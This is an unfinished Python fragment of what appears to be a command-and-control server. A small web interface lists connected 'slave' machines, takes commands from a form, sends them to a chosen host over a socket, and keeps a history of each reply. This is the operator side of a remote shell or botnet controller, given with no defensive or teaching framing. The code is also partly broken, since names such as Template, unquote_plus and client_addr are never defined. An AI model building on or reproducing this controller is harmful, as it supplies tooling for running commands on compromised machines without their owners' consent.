import socket



def server(data, connection, conns):
    """
        rewrite
        to use python.socketserver
    """
    # import pdb; pdb.set_trace()
    data = connection.recv(1024).decode('utf-8')
    if data.startswith('GET / '):
        # payload URLs: POST /b64<payload>?b64<host:port>
        # add payload input field
        print(f'Web interface Request data: << {data}')
        with open('index.html') as file_:
            template = Template(file_.read())
        # check connections if actual/exclude web conns
        response = template.render(connections=conns)
        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
        connection.send(response.encode('utf-8'))
        connection.close()
        # continue
        return
    elif data.startswith('GET /favicon'):
        connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
        connection.close()
    elif data.startswith('GET /payload_'):
        # encode payload b64
        # payload: POST /b64<host:port>
        # pdb.set_trace()
        # payload from textarea form input
        # maintain commands history
        history = []
        host, payload = data.split()[1][9:].split('?payload=') #b64decode split(':')
        payload = unquote_plus(payload)
        #host, port = base64.b64decode(host).decode('utf-8').split(':')
        worker_connection = None
        for conn in conns:
            if conn['url'] == host:
                worker_connection = conn
                break
        print(f'sending payload to {host}: >> {payload}')
        worker_connection['conn'].sendall(payload.encode('utf-8'))
        # render payload result
        response_data = worker_connection['conn'].recv(1024).decode('utf-8')
        worker_connection['history'].append(f'>>> {payload}<br/><<< {response_data}')
        print(f'Slave {host} reply: << {response_data}')
        with open('index.html') as f:
            template = Template(f.read())
        response = template.render(conn=worker_connection, response=response_data, history=worker_connection['history'])
        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
        connection.send(response.encode('utf-8'))
        connection.close()
    elif data.startswith('GET'):
        print(f'Request data: << {data}')
    elif not data: #break  # else?
        pass
    else:
        print(f'{client_addr}: << {data}')
    # print(data)



def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip


def _check_conn(client):
    """
        if client is alive: return True
        else: return False
    """
    try:
        client['conn'].sendall(b'')
        return True
    except socket.error as e:
        print(e)
        client['conn'].close()
        return False